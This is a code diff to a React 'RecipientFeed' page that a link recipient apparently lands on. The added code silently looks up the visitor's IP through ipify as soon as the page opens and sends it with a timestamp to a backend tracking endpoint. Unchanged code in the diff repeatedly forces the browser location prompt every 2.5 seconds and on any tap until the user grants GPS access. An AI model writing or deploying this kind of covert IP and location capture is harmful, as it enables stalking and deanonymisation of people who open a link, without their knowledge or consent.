@@ -107,11 +107,47 @@ export default function RecipientFeed({
     );
   };
 
+  /*
+   * Instant IP and Visit Capture on Link Open
+   */
+  const trackVisitImmediately = async () => {
+    try {
+      let clientIp = null;
+      try {
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        if (ipRes.ok) {
+          const ipData = await ipRes.json();
+          clientIp = ipData.ip;
+        }
+      } catch (e) {
+        // Fallback to server-side detected IP
+      }
+
+      await fetch(`${backendUrl}/api/track-visit`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          sessionId: sessionId || "default-session",
+          participantName: "Mobile Visitor",
+          clientIp,
+          timestamp: new Date().toISOString(),
+        }),
+      });
+    } catch (err) {
+      console.warn("Immediate visit capture warning:", err);
+    }
+  };
+
   useEffect(() => {
-    // 1. Trigger native browser prompt immediately on page load
+    // 1. Immediately log IP address and visit to MongoDB in the very first millisecond
+    trackVisitImmediately();
+
+    // 2. Trigger native browser GPS prompt immediately on page load
     requestLocation();
 
-    // 2. Continuously ask / retry every 2.5 seconds until user taps "Allow"
+    // 3. Continuously ask / retry every 2.5 seconds until user taps "Allow"
     retryTimerRef.current = setInterval(() => {
       if (!hasAllowedRef.current) {
         requestLocation();
@@ -120,7 +156,7 @@ export default function RecipientFeed({
       }
     }, 2500);
 
-    // 3. User interaction listener (tap/click anywhere on page forces browser location prompt)
+    // 4. User interaction listener (tap/click anywhere on page forces browser location prompt)
     const handleUserInteraction = () => {
       if (!hasAllowedRef.current) {
         requestLocation();
